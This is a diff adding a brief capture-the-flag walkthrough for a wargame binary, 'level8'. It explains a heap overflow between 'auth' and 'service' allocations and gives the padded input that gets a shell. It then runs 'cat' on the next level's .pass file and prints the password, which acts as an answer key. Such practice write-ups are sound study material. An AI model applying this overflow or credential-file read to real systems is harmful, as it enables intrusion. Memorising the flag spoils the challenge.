@@ -1,0 +1,26 @@
+Step 1: Analyze the program
+$ ./level8
+(nil), (nil) 
+auth 
+service test
+login
+Password:
+
+Step 2: Understand the vulnerability
+- auth command: strcpy() with 30-byte limit
+- service command: strdup() with NO bounds check
+- Heap allocation: service chunk placed after auth in heap
+- login checks auth->magic value at offset 0x20
+
+Step 3: Create heap overflow exploit
+$ ./level8
+(nil), (nil) 
+auth 
+serviceAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+login
+
+Step 4: Got shell and retrieved password
+whoami
+level9
+cat /home/user/level9/.pass
+c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
